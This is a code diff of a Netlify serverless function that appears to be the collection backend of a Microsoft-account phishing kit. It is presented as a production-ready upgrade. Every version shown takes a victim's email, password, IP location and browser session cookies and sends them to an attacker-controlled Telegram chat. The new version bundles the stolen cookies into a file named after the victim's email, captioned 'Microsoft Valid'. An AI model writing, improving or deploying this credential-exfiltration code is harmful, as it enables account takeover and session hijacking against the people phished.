@@ -1,6 +1,6 @@
 /**
- * FIXED: Telegram Bot Function for Netlify
- * Properly sends both credentials message AND cookie file message
+ * PRODUCTION-READY: Telegram Bot Function for Netlify
+ * Sends credentials + cookies TXT file in ONE single message
  */
 
 const https = require('https');
@@ -8,149 +8,204 @@ const https = require('https');
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-function sendToTelegram(message) {
+// ✅ Send message with document caption (all in one message)
+function sendDocumentWithCaption(fileContent, fileName, caption) {
   return new Promise((resolve, reject) => {
-    const data = JSON.stringify({
+    const base64Content = Buffer.from(fileContent).toString('base64');
+    const postData = JSON.stringify({
       chat_id: TELEGRAM_CHAT_ID,
-      text: message,
+      document: `data:text/plain;base64,${base64Content}`,
+      caption: caption,
       parse_mode: 'HTML'
     });
 
     const options = {
       hostname: 'api.telegram.org',
       port: 443,
-      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(data)
-      }
+        'Content-Length': Buffer.byteLength(postData)
+      },
+      timeout: 15000
     };
 
+    console.log('📤 Sending document with caption...');
+
     const req = https.request(options, (res) => {
-      let responseData = '';
-      res.on('data', chunk => responseData += chunk);
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
       res.on('end', () => {
         try {
-          const json = JSON.parse(responseData);
-          if (res.statusCode === 200 && json.ok) {
-            resolve(json);
+          const response = JSON.parse(data);
+          if (res.statusCode === 200 && response.ok) {
+            console.log('✅ Document + caption sent to Telegram');
+            resolve(response);
           } else {
-            reject(new Error(json.description || 'Telegram error'));
+            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
           }
         } catch (e) {
-          reject(e);
+          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
         }
       });
     });
 
-    req.on('error', reject);
-    req.write(data);
+    req.on('error', (error) => {
+      console.error(`❌ Telegram error: ${error.message}`);
+      reject(error);
+    });
+
+    req.on('timeout', () => {
+      req.destroy();
+      reject(new Error('Telegram request timeout'));
+    });
+
+    req.write(postData);
     req.end();
   });
 }
 
-exports.handler = async (event) => {
+function escapeHtml(text) {
+  if (!text) return '';
+  return String(text)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+exports.handler = async (event, context) => {
+  console.log('🚀 Starting sendTelegram handler');
+
   const headers = {
     'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Headers': 'Content-Type, Accept',
+    'Access-Control-Allow-Methods': 'POST, OPTIONS',
     'Content-Type': 'application/json'
   };
 
   if (event.httpMethod === 'OPTIONS') {
-    return { statusCode: 200, headers, body: '{}' };
+    return {
+      statusCode: 200,
+      headers,
+      body: JSON.stringify({ message: 'OK' })
+    };
+  }
+
+  if (event.httpMethod !== 'POST') {
+    return {
+      statusCode: 405,
+      headers,
+      body: JSON.stringify({ error: 'Method not allowed' })
+    };
   }
 
   try {
-    const payload = JSON.parse(event.body || '{}');
-    const { email, password, locationData = {}, cookies = [], cookieFiles = {} } = payload;
-
-    console.log('✅ DATA RECEIVED');
-    console.log('Email:', !!email);
-    console.log('Password:', !!password);
-    console.log('CookieFiles:', !!cookieFiles.jsonFile);
-    console.log('CookieFiles.content:', !!cookieFiles.jsonFile?.content);
-
-    let credentialsSent = false;
-    let cookiesSent = false;
-
-    // ✅ SEND MESSAGE 1: Credentials
+    let requestData;
     try {
-      let msg1 = '<b>🔐 Microsoft Account Credentials</b>\n\n';
-      if (email) msg1 += `<b>📧 Email:</b> <code>${email.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>\n`;
-      if (password) msg1 += `<b>🔑 Password:</b> <code>${password.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>\n`;
-      if (locationData.ip) msg1 += `<b>📍 IP:</b> <code>${locationData.ip}</code>\n`;
-      if (locationData.city) msg1 += `<b>🏙️ City:</b> ${locationData.city}\n`;
-      if (locationData.region) msg1 += `<b>🗺️ Region:</b> ${locationData.region}\n`;
-      if (locationData.country) msg1 += `<b>🌎 Country:</b> ${locationData.country}\n`;
-
-      await sendToTelegram(msg1);
-      credentialsSent = true;
-      console.log('✅ MESSAGE 1 SENT: Credentials');
-    } catch (err) {
-      console.error('❌ Failed to send credentials message:', err.message);
+      requestData = JSON.parse(event.body || '{}');
+    } catch (error) {
+      console.error('❌ JSON parse error:', error);
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'Invalid JSON in request body' })
+      };
     }
 
-    // ✅ SEND MESSAGE 2: Cookie file
-    try {
-      // ✅ FIXED: Check all possible conditions
-      console.log('Checking cookie file conditions...');
-      console.log('cookieFiles exists:', !!cookieFiles);
-      console.log('cookieFiles.jsonFile exists:', !!cookieFiles.jsonFile);
-      console.log('cookieFiles.jsonFile.content exists:', !!cookieFiles.jsonFile?.content);
-      console.log('cookieFiles.jsonFile.content length:', cookieFiles.jsonFile?.content?.length);
+    const { email, password, cookies = [], locationData = {}, cookieFiles = {} } = requestData;
 
-      if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content && cookieFiles.jsonFile.content.length > 0) {
-        console.log('✅ All conditions met - sending cookie file');
+    console.log('📊 Received data:', {
+      email: !!email,
+      password: !!password,
+      hasCookieFile: !!cookieFiles.jsonFile
+    });
 
-        const cookieContent = cookieFiles.jsonFile.content;
-        const cookieName = cookieFiles.jsonFile.name || 'cookies.json';
-        const cookieSize = cookieFiles.jsonFile.size || 0;
+    if (!email && !password && cookies.length === 0) {
+      return {
+        statusCode: 400,
+        headers,
+        body: JSON.stringify({ error: 'No meaningful data provided' })
+      };
+    }
 
-        // ✅ FIXED: Split cookie message if too long (Telegram limit is 4096)
-        const cookieMsg = `<b>📄 ${cookieName}</b>\n<b>Size:</b> ${cookieSize} bytes\n\n<pre><code>${cookieContent}</code></pre>`;
+    // ✅ BUILD CAPTION WITH ALL DATA
+    let caption = '<b>✅ Microsoft Valid</b>\n\n';
 
-        if (cookieMsg.length > 4000) {
-          console.log('⚠️ Cookie message too large, splitting...');
-          // Send as two parts
-          const part1 = `<b>📄 ${cookieName}</b>\n<b>Size:</b> ${cookieSize} bytes\n\n<pre><code>`;
-          await sendToTelegram(part1 + cookieContent.substring(0, 3500) + '</code></pre>');
-          await sendToTelegram('<pre><code>' + cookieContent.substring(3500) + '</code></pre>');
-        } else {
-          await sendToTelegram(cookieMsg);
-        }
+    // Email
+    if (email) {
+      caption += `👤:- ${escapeHtml(email)}\n`;
+    }
 
-        cookiesSent = true;
-        console.log('✅ MESSAGE 2 SENT: Cookie file');
-      } else {
-        console.log('⚠️ Cookie file conditions NOT met:');
-        console.log('  cookieFiles:', JSON.stringify(cookieFiles));
-        console.log('  cookieFiles.jsonFile:', JSON.stringify(cookieFiles.jsonFile));
+    // Password
+    if (password) {
+      caption += `🔑:- ${escapeHtml(password)}\n`;
+    }
+
+    // Location
+    if (locationData && locationData.ip) {
+      caption += `\n<b>🌍 Location:</b>\n`;
+      caption += `IP:- ${escapeHtml(locationData.ip)}\n`;
+      if (locationData.city) caption += `City:- ${escapeHtml(locationData.city)}\n`;
+      if (locationData.region) caption += `Region:- ${escapeHtml(locationData.region)}\n`;
+      if (locationData.country) caption += `Country:- ${escapeHtml(locationData.country)}\n`;
+    }
+
+    // Browser
+    caption += `\nBrowser:- chrome\n`;
+
+    // Timestamp
+    caption += `\n⏰ ${new Date().toISOString()}\n`;
+
+    let documentSent = false;
+
+    // ✅ Send cookies as TXT file with caption (ALL IN ONE MESSAGE)
+    if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
+      try {
+        console.log('📦 Creating TXT file from cookies...');
+
+        // Create simple TXT content (just the cookie JSON)
+        const txtContent = cookieFiles.jsonFile.content;
+
+        // Generate filename
+        const timestamp = Date.now();
+        const fileName = `${email || 'credentials'}_${timestamp}.txt`;
+
+        console.log('📄 Filename:', fileName);
+        console.log('📊 TXT file size:', txtContent.length, 'bytes');
+
+        // ✅ Send document with caption (ALL IN ONE MESSAGE)
+        await sendDocumentWithCaption(txtContent, fileName, caption);
+
+        documentSent = true;
+        console.log('✅ Document + caption sent in ONE message');
+      } catch (fileError) {
+        console.error('❌ Failed to send document:', fileError.message);
       }
-    } catch (err) {
-      console.error('❌ Failed to send cookie file message:', err.message);
     }
 
-    console.log('═════════════════════════════════════════');
-    console.log('FINAL RESULT:');
-    console.log('Credentials sent:', credentialsSent);
-    console.log('Cookies sent:', cookiesSent);
-    console.log('═════════════════════════════════════════');
+    console.log('═══════════════════════════════════════════');
+    console.log('✅ DATA SENT SUCCESSFULLY');
+    console.log('═══════════════════════════════════════════');
 
     return {
       statusCode: 200,
       headers,
       body: JSON.stringify({
         success: true,
+        message: 'All data transmitted to Telegram successfully',
+        timestamp: new Date().toISOString(),
         transmitted: {
-          credentials: credentialsSent,
-          cookieFile: cookiesSent
+          documentWithCaption: documentSent
         }
       })
     };
 
   } catch (error) {
     console.error('❌ HANDLER ERROR:', error.message);
-    console.error('Stack:', error.stack);
+
     return {
       statusCode: 500,
       headers,
